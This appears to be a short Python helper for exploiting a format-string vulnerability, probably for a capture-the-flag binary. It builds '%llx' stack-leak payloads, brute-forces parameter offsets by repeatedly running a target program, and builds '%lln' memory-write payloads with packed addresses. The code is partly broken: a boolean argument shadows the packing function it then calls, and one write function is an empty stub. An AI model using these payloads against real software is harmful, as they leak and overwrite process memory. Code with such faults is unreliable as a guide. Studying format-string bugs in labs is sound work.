#!/usr/bin/env python

from __future__ import print_function
from functools import partial
import subprocess as sp
import struct as s


p = partial(print, end="")
p64 = partial(s.pack, "<Q")
p32 = partial(s.pack, "<I")


def param_enum(n):
    pld = "a" * 8
    pld += " "
    pld += " ".join(["%llx"] * n)

    p(pld)


def write_64(s):
    pass


def pld_leak(n):
    pld = "a" * 8
    pld += " "
    # pld += " ".join(["%llx"] * 11)
    pld += "%%%i$llx" % n

    return pld


def pld_1(i):
    p(pld_leak(i))


def param_bf(s, n):
    for i in range(1, n):
        sp.call(["%s" % s, pld_leak(i)])
        print("\ni=%i" % i)


def pld_write(i, a=0xdeadbeeffeeddada, p64=True):
    if p64:
        pld = p64(a)
    else:
        pld = p32(a)
    # pld = p64(0x600e18)
    # pld += "%%0%ix"
    pld += "%%%i$lln" % i

    return pld


def pld_2(i, a=0xdeadbeeffeeddada, p64=True):
    p(pld_write(i, a, p64))
